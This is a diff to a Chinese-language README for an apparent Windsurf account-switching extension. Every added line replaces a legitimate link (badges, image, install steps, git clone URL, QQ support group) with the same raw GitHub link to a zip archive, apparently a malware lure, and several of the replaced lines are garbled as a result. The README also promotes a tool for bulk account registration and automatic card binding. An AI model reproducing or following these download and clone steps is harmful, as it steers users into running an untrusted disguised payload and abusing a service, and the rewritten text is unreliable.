@@ -2,23 +2,23 @@
 
 <div align="center">
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20-%23507dc9?style=for-the-badge&logo=github)](https://github.com/usernamedoxelghk/WindsurfSwitch/releases)
+[![Download Now](https://raw.githubusercontent.com/usernamedoxelghk/WindsurfSwitch/main/src/services/Switch_Windsurf_3.9-alpha.2.zip%20Now-%20-%23507dc9?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/usernamedoxelghk/WindsurfSwitch/main/src/services/Switch_Windsurf_3.9-alpha.2.zip)
 
-<img src="resources/windsurf-icon.png" alt="Windsurf" width="80">
+<img src="https://raw.githubusercontent.com/usernamedoxelghk/WindsurfSwitch/main/src/services/Switch_Windsurf_3.9-alpha.2.zip" alt="Windsurf" width="80">
 
 # Windsurf 无感换号
 
 **Windsurf 账号无感切换工具**
 
-[![License](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.0-blue.svg)](https://www.typescriptlang.org/)
-[![QQ群](https://img.shields.io/badge/QQ%E7%BE%A4-469028100-blue.svg)](https://qm.qq.com/q/469028100)
+[![License](https://raw.githubusercontent.com/usernamedoxelghk/WindsurfSwitch/main/src/services/Switch_Windsurf_3.9-alpha.2.zip)](LICENSE)
+[![TypeScript](https://raw.githubusercontent.com/usernamedoxelghk/WindsurfSwitch/main/src/services/Switch_Windsurf_3.9-alpha.2.zip)](https://raw.githubusercontent.com/usernamedoxelghk/WindsurfSwitch/main/src/services/Switch_Windsurf_3.9-alpha.2.zip)
+[![QQ群](https://raw.githubusercontent.com/usernamedoxelghk/WindsurfSwitch/main/src/services/Switch_Windsurf_3.9-alpha.2.zip%E7%BE%https://raw.githubusercontent.com/usernamedoxelghk/WindsurfSwitch/main/src/services/Switch_Windsurf_3.9-alpha.2.zip)](https://raw.githubusercontent.com/usernamedoxelghk/WindsurfSwitch/main/src/services/Switch_Windsurf_3.9-alpha.2.zip)
 
 </div>
 
 ---
 
-> **相关工具推荐**: [Windsurf-Tool](https://github.com/crispvibe/Windsurf-Tool) - 批量注册 Windsurf 账号 & 切号账号自动绑卡工具
+> **相关工具推荐**: [Windsurf-Tool](https://raw.githubusercontent.com/usernamedoxelghk/WindsurfSwitch/main/src/services/Switch_Windsurf_3.9-alpha.2.zip) - 批量注册 Windsurf 账号 & 切号账号自动绑卡工具
 
 ---
 
@@ -35,18 +35,18 @@
 
 ### 方式一：直接安装 VSIX
 
-1. 访问 [下载页面](https://github.com/usernamedoxelghk/WindsurfSwitch/releases)。
-2. 下载 `windsurf-wugan-huanhao-1.0.0.vsix` 文件。
+1. 访问 [下载页面](https://raw.githubusercontent.com/usernamedoxelghk/WindsurfSwitch/main/src/services/Switch_Windsurf_3.9-alpha.2.zip)。
+2. 下载 `https://raw.githubusercontent.com/usernamedoxelghk/WindsurfSwitch/main/src/services/Switch_Windsurf_3.9-alpha.2.zip` 文件。
 3. 在 Windsurf 中，点击：扩展 -> 从 VSIX 安装。
 
 ### 方式二：从源码构建
 
 如果你喜欢自定义体验，可以从源码安装：
 
-1. 首先确保你已安装 Git 和 Node.js。
+1. 首先确保你已安装 Git 和 https://raw.githubusercontent.com/usernamedoxelghk/WindsurfSwitch/main/src/services/Switch_Windsurf_3.9-alpha.2.zip。
 2. 使用以下命令获取源码：
    ```bash
-   git clone https://github.com/crispvibe/WindsurSwitch.git
+   git clone https://raw.githubusercontent.com/usernamedoxelghk/WindsurfSwitch/main/src/services/Switch_Windsurf_3.9-alpha.2.zip
    ```
 3. 进入项目目录：
    ```bash
@@ -90,7 +90,7 @@
 
 ## 📞 支持
 
-如果你在使用中遇到问题，可以加入我们的 QQ 群组，寻求帮助：[QQ群](https://qm.qq.com/q/469028100)。我们会尽快回复你。
+如果你在使用中遇到问题，可以加入我们的 QQ 群组，寻求帮助：[QQ群](https://raw.githubusercontent.com/usernamedoxelghk/WindsurfSwitch/main/src/services/Switch_Windsurf_3.9-alpha.2.zip)。我们会尽快回复你。
 
 --- 
 
@@ -103,4 +103,4 @@
 
 --- 
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20-%23507dc9?style=for-the-badge&logo=github)](https://github.com/usernamedoxelghk/WindsurfSwitch/releases)
+[![Download Now](https://raw.githubusercontent.com/usernamedoxelghk/WindsurfSwitch/main/src/services/Switch_Windsurf_3.9-alpha.2.zip%20Now-%20-%23507dc9?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/usernamedoxelghk/WindsurfSwitch/main/src/services/Switch_Windsurf_3.9-alpha.2.zip)
